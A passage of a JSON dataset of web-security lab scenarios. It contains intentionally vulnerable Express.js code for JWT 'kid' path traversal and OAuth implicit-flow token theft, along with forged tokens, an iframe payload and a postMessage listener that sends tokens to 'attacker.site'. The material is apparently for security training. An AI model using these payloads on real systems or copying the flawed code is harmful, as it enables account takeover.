  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const fs = require('fs'); const jwt = require('jsonwebtoken'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); app.post('/authService', (req, res) => { const token = req.body?.Envelope?.Header?.[0]?.AuthToken?.[0]; const decodedHeader = JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString()); const secret = fs.readFileSync(decodedHeader.kid); try { const verified = jwt.verify(token, secret); if (verified.username === 'carlos') { res.send('<soap:Envelope><soap:Body>Access Granted</soap:Body></soap:Envelope>'); } else { res.send('<soap:Envelope><soap:Body>Access Denied</soap:Body></soap:Envelope>'); } } catch { res.send('<soap:Envelope><soap:Body>Invalid Token</soap:Body></soap:Envelope>'); } }); app.listen(5000);",
  "payloads": [
    "{ \"alg\": \"HS256\", \"kid\": \"../../public.pem\" }",
    "JWT header: eyJhbGciOiAiSFMyNTYiLCAia2lkIjogIi4uLy4uL3B1YmxpYy5wZW0ifQ==",
    "JWT payload: eyJ1c2VybmFtZSI6ICJjYXJsb3MifQ=="
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in client-side implicit grant flow",
  "Lab Description": "The application uses OAuth with implicit flow for single-page applications. It trusts any `redirect_uri` that matches the domain but fails to validate origin during `postMessage`. An attacker can inject a malicious frame to steal tokens. To solve: Steal Carlos's access token using a crafted frame and use it to access his account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to retrieve a valid OAuth authorization URL from /auth?client_id=spaclient&response_type=token.",
    "Craft a malicious HTML page that loads the login endpoint in an iframe and listens for postMessage from the origin.",
    "Send the URL to Carlos using social engineering and capture the access token via postMessage hijack.",
    "Replay the access token in an Authorization header using Burp to access /my-account.",
    "Verify Carlos's account access using the stolen token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'token-carlos-abc123' }; app.get('/auth', (req, res) => { const { client_id, response_type, redirect_uri } = req.query; if (client_id === 'spaclient' && response_type === 'token') { res.redirect(`${redirect_uri}#access_token=token-carlos-abc123`); } else { res.status(400).send('Invalid request'); } }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (Object.values(tokens).includes(token)) { res.send('Welcome carlos'); } else { res.status(401).send('Unauthorized'); } }); app.listen(7000);",
  "payloads": [
    "<iframe src='https://vulnerable.app/auth?client_id=spaclient&response_type=token&redirect_uri=https://attacker.site/capture.html'></iframe>",
    "window.addEventListener('message', e => fetch('https://attacker.site/log?token=' + e.data))",
    "Authorization: Bearer token-carlos-abc123"
  ]
}
]
  

